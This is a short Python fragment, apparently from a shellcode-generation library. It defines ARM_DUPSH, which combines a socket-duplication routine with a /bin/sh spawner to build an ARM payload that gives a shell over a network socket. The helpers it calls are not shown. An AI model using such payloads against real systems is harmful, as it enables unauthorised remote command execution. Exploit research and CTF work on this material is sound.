# dupsh()
def ARM_DUPSH(sock=4, binsh='/bin/sh'):
    sc = ARM_DUP(sock)
    sc += ARM_SH(binsh)
    return sc
